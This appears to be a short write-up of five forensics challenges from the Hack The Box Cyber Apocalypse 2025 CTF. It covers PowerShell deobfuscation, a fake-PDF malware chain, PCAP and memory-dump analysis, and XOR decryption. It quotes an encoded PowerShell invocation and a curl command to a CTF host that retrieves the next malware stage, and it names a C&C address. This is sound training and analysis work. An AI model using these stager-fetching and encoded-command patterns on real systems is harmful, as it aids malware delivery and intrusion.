Just quick recap of the Forensics tasks - **more details coming** in following days, have **a lot** to do outside the area of offensive security so, forgive me for this format this time. Please follow-up on Discord and other socials for updates.

Challenges described below are from the Hack The Box Cyber Apocalypse 2025 CTF - [Tales From Eldoria](https://www.hackthebox.com/events/cyber-apocalypse-2025).

# Thorin’s Amulet

PowerShell payload deobfuscation. Decode command in script

```powershell
powershell.exe -NoProfile -NonInteractive -EncodedCommand /Base64 command/
```

Then

```powershell
curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" http://korp.htb/a541a
```

to obtain the next stage. Last stage contains encoded flag (just run it in Linux `pwsh`).

# A new Hire

Straightforward multistage payload, at the end there is a base64 encoded flag.

Read email, navigate to `storage.microsoftcloudservices.com:[PORT]/index.php` where another URL `http://IP:PORT/3fe1690d955e8fd2a0b282501570e1f4/resumes/` contains malicious file hiding as a PDF file

That contains one more base64 PowerShell encrypted command, where again, base64 encoded flag is located.

# Silent Trap

In the PCAP file we can find contents of mails, packet 72 contains mail from threat actor with attachment `Eldoria_Balance_Issue_Report.pdf.exe`. Bytes can be extracted from packet 614. We can decompile the program and discover the cypher is RC4 where same function works for encryption & decryption and it exfitrates data through IMAP protocole. Combing through the PCAP file we can find whole communication between host and C&C at `192.168.91.173`. Now that we have the decryptor/encrypt from reverse engineered binary we can decode all transfered data and answer other questions.

# Stealth Invasion

Delivered `memdump.elf` Windows memory dump can be analyzed with `volatility3`. The issue in my side was outdated installation, after updating to latest there were no issues with volatility modules.

# Cave Expedition

All Windows logs were pruned after operation, only traces are in the `Microsoft-Windows-Sysmon_Operational.evtx` from which we can decode all PowerShell payloads to dicover what happened. Slowly we deobfuscate stage by stage malicious payloads finally to obtains the ecryption method - which once again happen to be XORing (which is reversable regadless of how many XOR factors were used - here 2 times). Then `map.pdf.secured` can be decrypted.
